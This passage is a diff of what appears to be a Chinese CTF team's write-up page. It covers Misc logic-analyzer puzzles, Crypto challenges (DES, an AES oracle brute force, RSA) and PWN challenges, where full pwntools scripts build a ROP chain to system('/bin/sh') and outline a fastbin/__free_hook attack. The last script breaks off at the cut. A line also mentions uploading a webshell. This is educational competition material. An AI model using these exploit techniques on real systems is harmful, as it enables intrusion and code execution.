 </code></pre><p>11&#x3001;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4F3C;&#x4E4E;&#x6709;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#xFF0C;&#x4F20;&#x4E2A;&#x9A6C;&#x4E0A;&#x53BB;&#x8BD5;&#x8BD5;&#x3002;</p>
 <p>12&#x3001;&#x9776;&#x673A;&#x5173;&#x4E86;&#x6CA1;&#x6574;&#x4E86;&#xFF0C;&#x7B49;&#x590D;&#x73B0;&#x4E86;&#x3002;</p>
+<h2 id="misc"><a name="misc" class="plugin-anchor" href="#misc"><i class="fa fa-link" aria-hidden="true"></i></a>Misc</h2>
+<p><strong>&#x4F5C;&#x8005;&#xFF1A;wu1a</strong></p>
+<h3 id="&#x7B7E;&#x5230;&#x9898;"><a name="&#x7B7E;&#x5230;&#x9898;" class="plugin-anchor" href="#&#x7B7E;&#x5230;&#x9898;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7B7E;&#x5230;&#x9898;</h3>
+<p>&#x6253;&#x5F00;&#x6444;&#x50CF;&#x5934;&#x540E;&#xFF0C;&#x6709;&#x4E09;&#x4E2A;&#x4EBA;&#x88AB;&#x8BC6;&#x522B;&#x6709;&#x7EFF;&#x5708;&#xFF0C;&#x5C31;&#x4EE3;&#x8868;&#x6210;&#x529F;&#x4E86;&#xFF0C;cmd &#x754C;&#x9762;&#x5F39;&#x51FA; flag<br><img src="https://i.loli.net/2019/04/22/5cbde23cee362.png" alt="">  </p>
+<h3 id="saleae"><a name="saleae" class="plugin-anchor" href="#saleae"><i class="fa fa-link" aria-hidden="true"></i></a>saleae</h3>
+<p>&#x4E00;&#x5F00;&#x59CB;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A; web &#x624B;&#xFF0C;&#x5B8C;&#x5168;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;&#x5DE5;&#x63A7;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x4F46;&#x53D7;&#x5230;&#x9898;&#x76EE;&#x540D;&#x79F0;&#x7684;&#x542F;&#x53D1;&#xFF0C;&#x641C;&#x4E86;&#x4E00;&#x4E0B;<br>&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x7528;&#x4EC0;&#x4E48;&#x8F6F;&#x4EF6;&#x6253;&#x5F00;&#xFF0C;&#x5C31;&#x4E0B;&#x8F7D;&#x4E86; Logic &#x8FD9;&#x4E2A;&#x8F6F;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x6253;&#x5F00;&#x9898;&#x76EE;<br><img src="https://i.loli.net/2019/04/22/5cbde29d94eee.png" alt=""><br>&#x770B;&#x5230;&#x6709;&#x8FC7;&#x6EE4;&#x9009;&#x9879; &#x800C;&#x4E14;&#x53EA;&#x6709; 0 &#x548C; 2 &#x9891;&#x9053;&#x6709;&#x6CE2;&#x5F62;&#x56FE;&#xFF0C;&#x8C03;&#x6574;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;<br><img src="https://i.loli.net/2019/04/22/5cbde29d927c4.png" alt=""><br>&#x5F97;&#x5230;&#x4E86;<br><img src="https://i.loli.net/2019/04/22/5cbde29d73fd1.png" alt=""><br>&#x5BFC;&#x51FA;&#x540E; &#x7136;&#x540E;&#x7F16;&#x8F91;&#x4E00;&#x4E0B;&#x5C31;&#x662F; flag<br><img src="https://i.loli.net/2019/04/22/5cbde29daa3ab.png" alt="">  </p>
+<h3 id="24c"><a name="24c" class="plugin-anchor" href="#24c"><i class="fa fa-link" aria-hidden="true"></i></a>24c</h3>
+<p>&#x6253;&#x5F00;&#x7ED9;&#x7684; 24c.logicdata &#x6587;&#x4EF6;&#xFF0C;&#x5F97;&#x5230;&#xFF1A;<br><img src="https://i.loli.net/2019/04/22/5cbde36b54dd3.png" alt=""><br>&#x9009;&#x62E9; i2c &#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x76F4;&#x63A5;&#x51FA;&#x73B0;&#x4E86; flag &#x5B57;&#x6837;<br><img src="https://i.loli.net/2019/04/22/5cbde378e2764.png" alt=""><br>&#x76F4;&#x63A5;&#x5C31;&#x53BB;&#x63D0;&#x4EA4;&#x4E86;&#x8FD9;&#x4E2A;&#x5206;&#x79BB;&#x51FA;&#x6765;&#x7684; flag &#x7136;&#x540E;&#x4E00;&#x76F4;&#x62A5;&#x9519;&#xFF0C;&#x4E00;&#x5EA6;&#x6000;&#x7591;&#x9898;&#x76EE;&#x9519;&#x4E86;&#x3002;&#x76F4;&#x5230;&#x770B;&#x5230;&#x6709;&#x4E00;&#x6BB5;<br>&#x6709;&#x8BFB;&#x5199;&#x89C4;&#x5219;&#x7684;&#x8F6C;&#x6362;&#xFF0C;&#x624D;&#x77E5;&#x9053;&#x81EA;&#x5DF1;&#x4E0D;&#x6E05;&#x695A;&#x8FD9;&#x4E9B; flag &#x5B57;&#x6BB5;&#x662F;&#x600E;&#x4E48;&#x62FC;&#x63A5;&#x7684;&#x3002;<br>&#x56E0;&#x4E3A;&#x5BF9;&#x5DE5;&#x63A7;&#x4E0D;&#x662F;&#x5F88;&#x719F;&#x6089;&#xFF0C;&#x767E;&#x5EA6;&#x4E86;&#x4E00;&#x4E0B; 24C &#x82AF;&#x7247;&#x7684;&#x6570;&#x636E;&#x8BFB;&#x5199;&#x89C4;&#x5219;&#x5982;&#x4E0B;&#xFF0C;8bitdata &#x63A5;&#x4E0A; 1bitack<br>&#x6211;&#x4EEC;&#x5BFC;&#x51FA;&#x4E00;&#x4E0B;&#x83B7;&#x5F97;&#x7684;&#x6570;&#x636E;<br><img src="https://i.loli.net/2019/04/22/5cbde38008591.png" alt=""><br>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#x5206;&#x522B;&#x4E3A; f163bdf4e},flag{c4649e10-e9b5-4d90-a883-41c,ac<br>&#x73B0;&#x5728;&#x6839;&#x636E;&#x89C4;&#x5219;&#x5BF9;&#x8FD9;&#x4E09;&#x6BB5;&#x8FDB;&#x884C;&#x62FC;&#x63A5;<br>&#x518D;&#x5BFC;&#x51FA;&#x5199;&#x5165;&#x7684;&#x5730;&#x5740;&#x987A;&#x5E8F;&#x8868;<br><img src="https://i.loli.net/2019/04/22/5cbde386dafaf.png" alt=""><br>&#x4E86;&#x89E3;&#x4E00;&#x4E0B; 24c &#x5143;&#x4EF6;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x540E;&#xFF0C;&#x518D;&#x901A;&#x8FC7;&#x4E0A;&#x8868;&#x786E;&#x8BA4;&#x4E86; ac &#x5E76;&#x4E0D;&#x662F;&#x5199;&#x5728;&#x6700;&#x540E; flag &#x90A3;&#x4E00;&#x6BB5;&#x540E;&#x9762;&#x7684;&#xFF0C;<br>&#x800C;&#x662F;&#x63D2;&#x5728; flag{c4649e10-e9b5-4d90-a883-41c &#x4E2D;&#x7684;&#x3002;<br><img src="https://i.loli.net/2019/04/22/5cbde38e44893.png" alt=""><br><img src="https://i.loli.net/2019/04/22/5cbde39874953.png" alt=""><br><img src="https://i.loli.net/2019/04/22/5cbde39f74244.png" alt=""><br>&#x8FD9;&#x6837;&#x5C31;&#x5F97;&#x5230;&#x4E86;&#x62FC;&#x63A5;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x5F97;&#x5230;&#x4E86;&#x6B63;&#x786E;&#x7684; flag</p>
+<h3 id="badusb"><a name="badusb" class="plugin-anchor" href="#badusb"><i class="fa fa-link" aria-hidden="true"></i></a>badusb</h3>
+<p>&#x76F4;&#x63A5;&#x5148;&#x6253;&#x5F00;&#x8BFB;&#x6587;&#x4EF6;&#xFF1A;<br><img src="https://i.loli.net/2019/04/22/5cbde40537105.png" alt=""><br>&#x76F4;&#x63A5;&#x8C03;&#x6574;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x5E76;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5206;&#x6790;&#x7ED3;&#x679C;&#xFF0C;&#x6700;&#x7EC8;&#x53D1;&#x73B0;&#x53EA;&#x5728;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x7684;&#x89C4;&#x5219;&#x4E0B;&#x627E;&#x5230;&#x4E86;flag &#x5B57;&#x6BB5;<br><img src="https://i.loli.net/2019/04/22/5cbde40a93273.png" alt=""><br>&#x5728;&#x6700;&#x540E;&#x4E00;&#x6BB5;&#x6570;&#x636E;&#x5904;&#x53D1;&#x73B0;&#x4E86; flag<br><img src="https://i.loli.net/2019/04/22/5cbde41182d54.png" alt=""><br>&#x5BFC;&#x51FA;&#x7F16;&#x8F91;&#x548C;&#x6628;&#x5929;&#x7684;&#x7B2C;&#x4E00;&#x9898;&#x5DE5;&#x63A7;&#x4E00;&#x6837;<br><img src="https://i.loli.net/2019/04/22/5cbde4185ca4d.png" alt=""><br>&#x62FC;&#x63A5;&#x540E;&#x5C31;&#x5F97;&#x5230;&#x4E86;&#x6700;&#x540E;&#x7684; flag  </p>
 <h2 id="crypto"><a name="crypto" class="plugin-anchor" href="#crypto"><i class="fa fa-link" aria-hidden="true"></i></a>Crypto</h2>
+<p><strong>&#x4F5C;&#x8005;&#xFF1A;wu1a&#x3001;&#x533F;&#x540D;</strong></p>
 <h3 id="puzzles"><a name="puzzles" class="plugin-anchor" href="#puzzles"><i class="fa fa-link" aria-hidden="true"></i></a>puzzles</h3>
+<p><strong>&#x4F5C;&#x8005;&#xFF1A;&#x533F;&#x540D;</strong></p>
 <h6 id="question0"><a name="question0" class="plugin-anchor" href="#question0"><i class="fa fa-link" aria-hidden="true"></i></a>Question0</h6>
 <p>&#x8FD9;&#x9898;&#x5C31;&#x662F;&#x8BA1;&#x7B97;&#x4E00;&#x4E2A;&#x56DB;&#x5143;&#x4E00;&#x6B21;&#x65B9;&#x7A0B;&#x7EC4;&#xFF0C;&#x4F7F;&#x7528;Python&#x91CC;&#x7684;numpy&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6C42;&#x89E3;&#x3002;
 <img src="https://0d077ef9e74d8.cdn.sohucs.com/ron3dDP_png" alt="">  </p>
 <p>&#x5F97;&#x5230;&#x7ED3;&#x679C;[4006. 3053. 2503. 2560.]</p>
-<p>&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x5F97;&#x5230;fa6bed9c7a00</p>
+<p>&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x5F97;&#x5230;<code>fa6bed9c7a00</code></p>
 <h5 id="question1"><a name="question1" class="plugin-anchor" href="#question1"><i class="fa fa-link" aria-hidden="true"></i></a>Question1</h5>
 <p><code>question1</code>&#x601D;&#x8003;&#x4E86;&#x4E00;&#x4F1A;&#xFF0C;&#x5C1D;&#x8BD5;&#x4ECE;<code>26364809</code>&#x5F00;&#x59CB;&#x641C;&#x7D20;&#x6570;&#xFF0C;&#x53D1;&#x73B0;<code>26364809</code>&#x662F;&#x7B2C;<code>2</code>&#x4E2A;&#x7D20;&#x6570;&#xFF0C;<code>26366033</code>&#x662F;&#x7B2C;<code>76</code>&#x4E2A;&#xFF0C;<code>26366621</code>&#x662F;&#x7B2C;<code>113</code>&#x4E2A;&#x3002;&#x6210;&#x4E00;&#x4E2A;&#x516C;&#x5DEE;&#x4E3A;<code>37</code>&#x7684;&#x7B49;&#x5DEE;&#x6570;&#x5217;&#x3002;&#x6240;&#x4EE5;<code>part1</code>&#x662F;&#x7B2C;<code>39</code>&#x4E2A;&#x7D20;&#x6570;&#xFF0C;&#x5373;<code>26365399</code>&#x3002;<br><code>part1=1924dd7</code></p>
 <h5 id="question2&#x3001;3&#x3001;4"><a name="question2&#x3001;3&#x3001;4" class="plugin-anchor" href="#question2&#x3001;3&#x3001;4"><i class="fa fa-link" aria-hidden="true"></i></a>Question2&#x3001;3&#x3001;4</h5>
@@ -1250,6 +1263,394 @@ if (isset($_FILES[&quot;file&quot;])) {
 <p>&#x7B2C;&#x56DB;&#x9898;&#x8003;&#x7684;&#x662F;&#x4E09;&#x91CD;&#x79EF;&#x5206;<br><img src="https://pic.superbed.cn/item/5cbdad483a213b0417aba5c2" alt="https://s2.ax1x.com/2019/04/22/Ekv7fs.gif"><br>&#x4EE4;<code>x=rcosa,y=rsina</code>&#x3002;&#x53EF;&#x4EE5;&#x5C06;&#x4E0A;&#x5F0F;&#x8F6C;&#x5316;&#x4E3A;&#xFF1A;<br><img src="https://s2.ax1x.com/2019/04/22/Ekvbpn.gif" alt=""><br>&#x8FD9;&#x6837;&#x5C31;&#x5C06;&#x4E09;&#x91CD;&#x79EF;&#x5206;&#x8F6C;&#x5316;&#x6210;&#x4E86;&#x4E09;&#x6B21;&#x5B9A;&#x79EF;&#x5206;&#x3002;&#x5E76;&#x7ED3;&#x5408;&#x7B49;&#x5F0F;&#x5DE6;&#x8FB9;&#x7684;&#x5F0F;&#x5B50;&#x5F97;&#x51FA;&#x7ED3;&#x679C;&#x3002;<code>part4=40320</code>
 &#x8F6C;&#x5316;&#x6210;flag&#x683C;&#x5F0F; <code>part4=9d80</code></p>
 <p>&#x6700;&#x540E;&#x62FC;&#x63A5;&#x5728;&#x4E00;&#x8D77;&#x5F97;&#x5230;flag</p>
+<h3 id="partdes"><a name="partdes" class="plugin-anchor" href="#partdes"><i class="fa fa-link" aria-hidden="true"></i></a>Part_des</h3>
+<p>Key map &#x4E3A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#xFF0C;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x540E;&#x53D1;&#x73B0;&#x4E3A; 768 &#x4F4D;&#xFF0C;&#x5373; 16*48&#xFF0C;&#x662F;des&#x52A0;&#x5BC6;&#x7684;16&#x8F6E;&#x5B50;&#x5BC6;&#x94A5;&#xFF0C;&#x4ECE;&#x7F51;&#x4E0A;&#x627E;&#x5230; des &#x7684;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF0C;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#x5373;&#x53EF;&#x89E3;&#x51FA;<br><img src="https://i.loli.net/2019/04/22/5cbde46374018.png" alt=""><br><img src="https://i.loli.net/2019/04/22/5cbde4662ec7d.png" alt="">  </p>
+<h3 id="warmup"><a name="warmup" class="plugin-anchor" href="#warmup"><i class="fa fa-link" aria-hidden="true"></i></a>Warmup</h3>
+<p>&#x6253;&#x5F00;&#x811A;&#x672C;&#x67E5;&#x770B;&#x52A0;&#x5BC6;&#x903B;&#x8F91;&#xFF0C;&#x53D1;&#x73B0;&#x6BCF;&#x6B21; nc&#x8FDE;&#x4E0A;&#x670D;&#x52A1;&#x5668;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x968F;&#x673A;&#x7684;16&#x4F4D;key&#x548C;4 &#x4F4D;prefix&#x3001;
+suffix&#xFF0C;&#x518D;&#x7528; prefix &#x548C; suffix &#x751F;&#x6210; 64 &#x4F4D;&#x7684; count&#xFF0C;&#x7136;&#x540E;&#x7528; count &#x548C; key &#x751F;&#x6210; cipher&#x3002;&#x670D;&#x52A1;&#x5F97;&#x5230;
+&#x6211;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x5728;&#x540E;&#x9762;&#x62FC;&#x63A5;&#x6B63;&#x786E;&#x7684; flag &#x540E;&#x8FDB;&#x884C; aes &#x52A0;&#x5BC6;&#x5E76;&#x8F93;&#x51FA;&#x3002;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x670D;&#x52A1;<br><img src="https://i.loli.net/2019/04/22/5cbde4f2ab804.png" alt=""><br>&#x7206;&#x7834;&#x5373;&#x53EF;  </p>
+<pre class="language-"><code>#coding:utf-8
+#__author__:wu1a
+from pwn import *
+import string
+def boom(k,flag):
+for i in range(k,len(string)):
+payload = flag + string[i]
+p.sendline(payload)
+aaa = p.recvline()[17:].replace(&quot;\n&quot;,&quot;&quot;)
+aaa = aaa[:(len(flag)+1)*2]
+# print aaa
+if aaa in flag_aes:
+print &quot;ok&quot;,payload
+boom(0,payload)
+else:
+pass
+# context.log_level=&apos;debug&apos;
+p = remote(&quot;fc32f84bc46ac22d97e5f876e3100922.kr-lab.com&quot;,12345)
+string=&quot;{}&quot; + string.ascii_lowercase + &quot;-0123456789&quot;
+flag=&quot;flag&quot;
+p.recvuntil(&quot;Welcome to flag getting system\n&quot;)
+p.sendline(&quot;&quot;)
+flag_aes=p.recvline()[17:].replace(&quot;\n&quot;,&quot;&quot;)
+log.info(&quot;flag_aes -&gt; &quot; + flag_aes)
+boom(0,flag)
+# p.interactive()
+</code></pre><p><img src="https://i.loli.net/2019/04/22/5cbde4fc52abb.png" alt="">  </p>
+<h3 id="asymmetric"><a name="asymmetric" class="plugin-anchor" href="#asymmetric"><i class="fa fa-link" aria-hidden="true"></i></a>Asymmetric</h3>
+<p>&#x6253;&#x5F00;&#x52A0;&#x5BC6;&#x811A;&#x672C;&#x540E;&#x53D1;&#x73B0;&#x8FC7;&#x7A0B;&#x7C7B;&#x4F3C; RSA &#x52A0;&#x5BC6;&#xFF0C;&#x5C1D;&#x8BD5;&#x7528; RSA &#x89E3;&#x5BC6;&#xFF0C;&#x5148;&#x5206;&#x89E3; n &#x5F97;&#x5230;<br><img src="https://i.loli.net/2019/04/23/5cbde508a116f.png" alt="">  </p>
+<pre class="language-"><code>pP=1657407551907933046558545060527940723781810462521183676934573856328183290415
+404194886254720077100621286329426643663835514524985415605387445829227138086113
+201767704015876746181218857199538311224872809784181103805973587479154209280538
+60076414097300832349400288770613227105348835005596365488460445438176193451867
+R=4
+</code></pre><p>&#x6839;&#x636E;&#x6B27;&#x62C9;&#x51FD;&#x6570; p<strong>4-p</strong>3 &#x8BA1;&#x7B97; n&#xFF0C;&#x518D;&#x8BA1;&#x7B97;&#x5F97;&#x5230; flag
+<img src="https://i.loli.net/2019/04/23/5cbde5184e85f.png" alt="">  </p>
+<h2 id="pwn"><a name="pwn" class="plugin-anchor" href="#pwn"><i class="fa fa-link" aria-hidden="true"></i></a>PWN</h2>
+<p><strong>&#x4F5C;&#x8005;&#xFF1A;warden&#x3001;wu1a</strong></p>
+<h3 id="yourpwn"><a name="yourpwn" class="plugin-anchor" href="#yourpwn"><i class="fa fa-link" aria-hidden="true"></i></a>your_pwn</h3>
+<p>&#x53EF;&#x91CD;&#x590D;&#x5229;&#x7528;&#x7684;&#x5355;&#x5B57;&#x8282;&#x8BFB;&#x5199;&#x7684;&#x6F0F;&#x6D1E;.  </p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde6ec9e932.png" alt=""></p>
+<p>&#x5148;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x6808;&#x4E0A;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x6CC4;&#x9732;<code>pie</code>&#x57FA;&#x5740;.<br>&#x7136;&#x540E;&#x6784;&#x9020;<code>ROP</code>&#x94FE;&#x6253;&#x5370;&#x5E93;&#x51FD;&#x6570;&#x5730;&#x5740;&#x6CC4;&#x9732;<code>libc</code>.&#x76F4;&#x63A5;&#x8C03;&#x7528;<code>system(binsh);</code>&#x83B7;&#x5F97;<code>flag</code>.  </p>
+<pre class="language-"><code class="lang-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">&apos;debug&apos;</span>
+pop_rdi_ret <span class="token operator">=</span> <span class="token number">0xd03</span>
+pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0xd01</span>
+<span class="token comment">#r = process(&quot;./pwn&quot;)</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;57856&quot;</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;w4rd3n&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> <span class="token number">0</span>
+    ll <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;index\n&quot;</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        data <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;value\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span>
+        data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            ll <span class="token operator">+=</span> data <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">**</span> i<span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        i <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">41</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;continue(yes/no)? \n&quot;</span><span class="token punctuation">)</span>
+            r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;yes&quot;</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> ll
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;index\n&quot;</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;value\n&quot;</span><span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token number">0</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">**</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x100</span>
+        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        i <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">41</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;continue(yes/no)? \n&quot;</span><span class="token punctuation">)</span>
+            r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;yes&quot;</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+pie <span class="token operator">=</span> get<span class="token punctuation">(</span><span class="token number">0x158</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xb11</span>
+<span class="token keyword">print</span> <span class="token string">&quot;pie: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>pie<span class="token punctuation">)</span>
+
+write<span class="token punctuation">(</span><span class="token number">0x158</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>pie <span class="token operator">+</span> pop_rdi_ret<span class="token punctuation">,</span> pie <span class="token operator">+</span> <span class="token number">0x202020</span><span class="token punctuation">,</span> pie <span class="token operator">+</span> <span class="token number">0x8B0</span><span class="token punctuation">,</span> pie <span class="token operator">+</span> <span class="token number">0xb0c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">&apos;\0&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x06f690</span>
+<span class="token keyword">print</span> <span class="token string">&quot;libc: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+
+system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x045390</span>
+binsh <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x18cd57</span>
+
+write<span class="token punctuation">(</span><span class="token number">0x158</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>pie <span class="token operator">+</span> pop_rdi_ret<span class="token punctuation">,</span> binsh<span class="token punctuation">,</span> system<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="daily"><a name="daily" class="plugin-anchor" href="#daily"><i class="fa fa-link" aria-hidden="true"></i></a>daily</h3>
+<p><code>remove</code>&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x5BF9;<code>index</code>&#x8FDB;&#x884C;&#x8303;&#x56F4;&#x68C0;&#x6D4B;.  </p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde706ee0aa.png" alt="">  </p>
+<p>&#x5148;&#x5229;&#x7528;<code>unsorted bin</code>&#x6CC4;&#x9732;<code>libc</code>,&#x518D;&#x5229;&#x7528;<code>fastbin</code>&#x5355;&#x94FE;&#x8868;&#x6CC4;&#x9732;<code>heap</code>&#x57FA;&#x5740;.</p>
+<p>&#x7533;&#x8BF7;&#x4E00;&#x4E2A;<code>chunk</code>,&#x5728;&#x91CC;&#x9762;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x548C;&#x5BF9;&#x5E94;&#x7684;<code>faker chunk</code>.<br><code>free</code>&#x6389;&#x8FD9;&#x4E2A;<code>faker chunk</code>,&#x901A;&#x8FC7;<code>edit</code>&#x6784;&#x9020;&#x5176;<code>fd</code>&#x5230;<code>bss</code>&#x4E0A;,&#x7531;&#x4E8E;<code>length</code>&#x53EF;&#x63A7;,&#x901A;&#x8FC7;<code>remove</code>&#x6784;&#x9020;&#x51FA;&#x4E00;&#x4E2A;<code>chunk</code>&#x5934;&#x90E8;&#x7ED5;&#x8FC7;&#x68C0;&#x67E5;.<br>&#x6210;&#x529F;<code>fastbin attack</code>,&#x83B7;&#x5F97;&#x4EFB;&#x610F;&#x8BFB;&#x5199;&#x7684;&#x80FD;&#x529B;,&#x7531;&#x4E8E;&#x7A0B;&#x5E8F;&#x5F00;&#x4E86;<code>Full RELRO</code>&#x6240;&#x4EE5;&#x52AB;&#x6301;<code>__free_hook</code>&#x8C03;&#x7528;<code>system(binsh);</code>&#x83B7;&#x5F97;<code>flag</code>.</p>
+<pre class="language-"><code class="lang-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">&apos;debug&apos;</span>
+<span class="token comment">#r = process(&quot;./pwn&quot;)</span>
+ptr <span class="token operator">=</span> <span class="token number">0x602060</span>
